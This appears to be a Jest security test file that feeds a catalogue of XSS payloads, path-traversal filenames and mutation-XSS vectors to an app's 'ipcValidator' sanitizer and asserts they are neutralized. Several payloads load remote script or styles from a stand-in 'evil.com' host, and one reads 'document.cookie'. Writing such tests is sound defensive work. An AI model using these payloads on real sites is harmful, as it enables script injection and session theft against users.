const ipcValidator = require('../../src/utils/ipcValidator');
const { JSDOM } = require('jsdom');

describe('XSS (Cross-Site Scripting) Security Tests', () => {
    let dom;
    let document;
    let window;

    beforeEach(() => {
        dom = new JSDOM('<!DOCTYPE html><html><body><div id="output"></div></body></html>');
        document = dom.window.document;
        window = dom.window;
    });

    describe('HTML Injection Prevention', () => {
        test('should sanitize script tags', () => {
            const xssAttempts = [
                '<script>alert("XSS")</script>',
                '<SCRIPT>alert("XSS")</SCRIPT>',
                '<script src="http://evil.com/hack.js"></script>',
                '<script>document.cookie</script>',
                '<<SCRIPT>alert("XSS");//<</SCRIPT>'
            ];

            xssAttempts.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                expect(sanitized).not.toContain('<script');
                expect(sanitized).not.toContain('</script>');
                
                // Test DOM safety
                document.getElementById('output').innerHTML = sanitized;
                expect(document.querySelectorAll('script').length).toBe(0);
            });
        });

        test('should sanitize event handlers', () => {
            const eventHandlers = [
                '<img src=x onerror="alert(\'XSS\')">',
                '<body onload="alert(\'XSS\')">',
                '<div onclick="alert(\'XSS\')">Click me</div>',
                '<input onfocus="alert(\'XSS\')" autofocus>',
                '<svg onload="alert(\'XSS\')">',
                '<iframe onload="alert(\'XSS\')">'
            ];

            eventHandlers.forEach(handler => {
                const sanitized = ipcValidator.sanitizeInput(handler);
                expect(sanitized).not.toMatch(/on\w+\s*=/i);
                
                // Test DOM safety
                document.getElementById('output').innerHTML = sanitized;
                const elements = document.querySelectorAll('*');
                elements.forEach(el => {
                    const attributes = el.getAttributeNames();
                    attributes.forEach(attr => {
                        expect(attr).not.toMatch(/^on/i);
                    });
                });
            });
        });

        test('should sanitize javascript: protocol', () => {
            const jsProtocol = [
                '<a href="javascript:alert(\'XSS\')">Click</a>',
                '<a href="JAVASCRIPT:alert(\'XSS\')">Click</a>',
                '<a href="   javascript:alert(\'XSS\')">Click</a>',
                '<img src="javascript:alert(\'XSS\')">',
                '<form action="javascript:alert(\'XSS\')">'
            ];

            jsProtocol.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                expect(sanitized).not.toMatch(/javascript:/i);
                
                // Test DOM safety
                document.getElementById('output').innerHTML = sanitized;
                const links = document.querySelectorAll('a[href]');
                links.forEach(link => {
                    expect(link.href).not.toMatch(/^javascript:/i);
                });
            });
        });

        test('should sanitize data: protocol with script', () => {
            const dataProtocol = [
                '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
                '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
                '<embed src="data:text/html,<script>alert(\'XSS\')</script>">'
            ];

            dataProtocol.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                if (sanitized.includes('data:')) {
                    expect(sanitized).not.toContain('<script');
                }
            });
        });
    });

    describe('Encoding Bypass Attempts', () => {
        test('should handle HTML entity encoding', () => {
            const entityAttempts = [
                '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
                '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
                '&#x3C;script&#x3E;alert(&#x22;XSS&#x22;)&#x3C;/script&#x3E;'
            ];

            entityAttempts.forEach(attempt => {
                const decoded = attempt.replace(/&[#\w]+;/g, (match) => {
                    const temp = document.createElement('div');
                    temp.innerHTML = match;
                    return temp.textContent;
                });
                
                const sanitized = ipcValidator.sanitizeInput(decoded);
                expect(sanitized).not.toContain('<script');
            });
        });

        test('should handle URL encoding', () => {
            const urlEncoded = [
                decodeURIComponent('%3Cscript%3Ealert(%22XSS%22)%3C/script%3E'),
                decodeURIComponent('%3C%73%63%72%69%70%74%3E'), // <script>
            ];

            urlEncoded.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                expect(sanitized).not.toContain('<script');
            });
        });

        test('should handle Unicode encoding', () => {
            const unicodeAttempts = [
                '\u003Cscript\u003Ealert("XSS")\u003C/script\u003E',
                '\u0074\u0065\u0073\u0074', // test
            ];

            unicodeAttempts.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                expect(sanitized).not.toContain('<script');
            });
        });

        test('should handle base64 encoding in data URLs', () => {
            const base64Attempts = [
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
                // <script>alert('XSS')</script> in base64
            ];

            base64Attempts.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                // Should either remove or neutralize base64 data URLs
                if (sanitized.includes('base64')) {
                    expect(sanitized).not.toMatch(/data:.*base64/);
                }
            });
        });
    });

    describe('DOM-based XSS Prevention', () => {
        test('should prevent innerHTML injection', () => {
            const dangerousHTML = '<img src=x onerror="alert(\'XSS\')">';
            const sanitized = ipcValidator.sanitizeInput(dangerousHTML);
            
            // Safe to use with innerHTML after sanitization
            const div = document.createElement('div');
            div.innerHTML = sanitized;
            
            const img = div.querySelector('img');
            if (img) {
                expect(img.getAttribute('onerror')).toBeNull();
            }
        });

        test('should prevent document.write injection', () => {
            const payloads = [
                '<script>document.write("<img src=x onerror=alert(1)>")</script>',
                'document.write("<script>alert(1)</script>")'
            ];

            payloads.forEach(payload => {
                const sanitized = ipcValidator.sanitizeInput(payload);
                expect(sanitized).not.toContain('document.write');
                expect(sanitized).not.toContain('<script');
            });
        });

        test('should prevent eval() injection', () => {
            const evalPayloads = [
                'eval("alert(\'XSS\')")',
                'setTimeout("alert(\'XSS\')", 0)',
                'setInterval("alert(\'XSS\')", 1000)',
                'Function("alert(\'XSS\')")()'
            ];

            evalPayloads.forEach(payload => {
                const sanitized = ipcValidator.sanitizeInput(payload);
                expect(sanitized).not.toContain('eval(');
                expect(sanitized).not.toContain('setTimeout(');
                expect(sanitized).not.toContain('setInterval(');
                expect(sanitized).not.toContain('Function(');
            });
        });
    });

    describe('CSS Injection Prevention', () => {
        test('should sanitize style tags with JavaScript', () => {
            const cssInjection = [
                '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
                '<div style="background: url(\'javascript:alert(1)\')">',
                '<style>@import "http://evil.com/evil.css";</style>',
                '<link rel="stylesheet" href="javascript:alert(\'XSS\')">'
            ];

            cssInjection.forEach(attempt => {
                const sanitized = ipcValidator.sanitizeInput(attempt);
                expect(sanitized).not.toMatch(/javascript:/i);
                expect(sanitized).not.toMatch(/@import/i);
            });
        });

        test('should sanitize CSS expressions', () => {
            const expressions = [
                '<div style="width: expression(alert(\'XSS\'))">',
                '<div style="behavior: url(\'http://evil.com/xss.htc\')">',
                '<div style="binding: url(\'http://evil.com/xss.xml#xss\')">'
            ];

            expressions.forEach(expr => {
                const sanitized = ipcValidator.sanitizeInput(expr);
                expect(sanitized).not.toContain('expression(');
                expect(sanitized).not.toContain('behavior:');
                expect(sanitized).not.toContain('binding:');
            });
        });
    });

    describe('SVG XSS Prevention', () => {
        test('should sanitize SVG with embedded scripts', () => {
            const svgXSS = [
                '<svg><script>alert("XSS")</script></svg>',
                '<svg onload="alert(\'XSS\')"></svg>',
                '<svg><animate onbegin="alert(\'XSS\')" />',
                '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>'
            ];

            svgXSS.forEach(svg => {
                const sanitized = ipcValidator.sanitizeInput(svg);
                expect(sanitized).not.toContain('<script');
                expect(sanitized).not.toMatch(/on\w+=/i);
            });
        });
    });

    describe('Template Injection Prevention', () => {
        test('should sanitize template literals', () => {
            const templates = [
                '${alert("XSS")}',
                '{{alert("XSS")}}',
                '<%=alert("XSS")%>',
                '#{alert("XSS")}'
            ];

            templates.forEach(template => {
                const sanitized = ipcValidator.sanitizeInput(template);
                // Should escape or remove template syntax
                expect(sanitized).not.toContain('alert(');
            });
        });
    });

    describe('JSON Injection Prevention', () => {
        test('should safely handle JSON with XSS attempts', () => {
            const jsonWithXSS = {
                name: '<script>alert("XSS")</script>',
                description: 'Normal text',
                onclick: 'alert("XSS")',
                data: {
                    nested: '<img src=x onerror="alert(\'XSS\')">'
                }
            };

            const sanitized = ipcValidator.sanitizeJSON(jsonWithXSS);
            expect(sanitized.name).not.toContain('<script');
            expect(sanitized.onclick).not.toContain('alert(');
            expect(sanitized.data.nested).not.toContain('onerror');
        });

        test('should handle arrays in JSON', () => {
            const arrayWithXSS = [
                '<script>alert(1)</script>',
                'normal string',
                { xss: '<img src=x onerror="alert(1)">' }
            ];

            const sanitized = ipcValidator.sanitizeJSON(arrayWithXSS);
            expect(sanitized[0]).not.toContain('<script');
            expect(sanitized[2].xss).not.toContain('onerror');
        });
    });

    describe('File Upload XSS Prevention', () => {
        test('should sanitize filenames', () => {
            const maliciousFilenames = [
                '"><script>alert("XSS")</script>.txt',
                '../../../etc/passwd',
                'file.txt<script>alert(1)</script>',
                'file.php.txt',
                'file.asp;.jpg'
            ];

            maliciousFilenames.forEach(filename => {
                const sanitized = ipcValidator.sanitizeFilename(filename);
                expect(sanitized).not.toContain('<script');
                expect(sanitized).not.toContain('..');
                expect(sanitized).not.toContain(';');
            });
        });

        test('should validate file extensions', () => {
            const files = [
                { name: 'file.exe', allowed: false },
                { name: 'file.js', allowed: false },
                { name: 'file.html', allowed: false },
                { name: 'file.txt', allowed: true },
                { name: 'file.jpg', allowed: true }
            ];

            const allowedExtensions = ['.txt', '.jpg', '.png', '.pdf'];
            
            files.forEach(file => {
                const ext = file.name.substring(file.name.lastIndexOf('.'));
                const isAllowed = allowedExtensions.includes(ext);
                expect(isAllowed).toBe(file.allowed);
            });
        });
    });

    describe('Content Security Policy', () => {
        test('should generate safe CSP headers', () => {
            const csp = ipcValidator.generateCSP();
            
            expect(csp).toContain("default-src 'self'");
            expect(csp).toContain("script-src 'self'");
            expect(csp).not.toContain("'unsafe-inline'");
            expect(csp).not.toContain("'unsafe-eval'");
            expect(csp).toContain("object-src 'none'");
        });
    });

    describe('Mutation XSS (mXSS) Prevention', () => {
        test('should handle mutation-based XSS', () => {
            const mxssPayloads = [
                '<svg><style><img src=x onerror=alert(1)></style></svg>',
                '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)-->',
                '<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>'
            ];

            mxssPayloads.forEach(payload => {
                const sanitized = ipcValidator.sanitizeInput(payload);
                
                // Create element and check mutations
                const div = document.createElement('div');
                div.innerHTML = sanitized;
                
                // Should not contain executable scripts after mutation
                const scripts = div.querySelectorAll('script');
                const imgs = div.querySelectorAll('img[onerror]');
                
                expect(scripts.length).toBe(0);
                expect(imgs.length).toBe(0);
            });
        });
    });

    describe('Context-Aware Sanitization', () => {
        test('should sanitize based on context', () => {
            const contexts = {
                html: '<div>User input: <script>alert(1)</script></div>',
                attribute: '" onmouseover="alert(1)',
                javascript: "'; alert(1); //",
                css: "background: url('javascript:alert(1)')",
                url: "javascript:alert(1)"
            };

            expect(ipcValidator.sanitizeForHTML(contexts.html))
                .not.toContain('<script');
            
            expect(ipcValidator.sanitizeForAttribute(contexts.attribute))
                .not.toContain('onmouseover');
            
            expect(ipcValidator.sanitizeForJS(contexts.javascript))
                .not.toContain('alert(');
            
            expect(ipcValidator.sanitizeForCSS(contexts.css))
                .not.toContain('javascript:');
            
            expect(ipcValidator.sanitizeForURL(contexts.url))
                .not.toMatch(/^javascript:/);
        });
    });

    describe('Output Encoding', () => {
        test('should properly encode for HTML context', () => {
            const input = '<script>alert("XSS")</script>';
            const encoded = ipcValidator.htmlEncode(input);
            
            expect(encoded).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
            
            // Safe to display
            document.getElementById('output').innerHTML = encoded;
            expect(document.querySelectorAll('script').length).toBe(0);
        });

        test('should properly encode for JavaScript context', () => {
            const input = "'; alert('XSS'); //";
            const encoded = ipcValidator.jsEncode(input);
            
            expect(encoded).not.toContain("'");
            expect(encoded).toContain("\\'");
        });

        test('should properly encode for URL context', () => {
            const input = 'javascript:alert("XSS")';
            const encoded = ipcValidator.urlEncode(input);
            
            expect(encoded).not.toContain('javascript:');
            expect(encoded).toContain('%');
        });
    });
});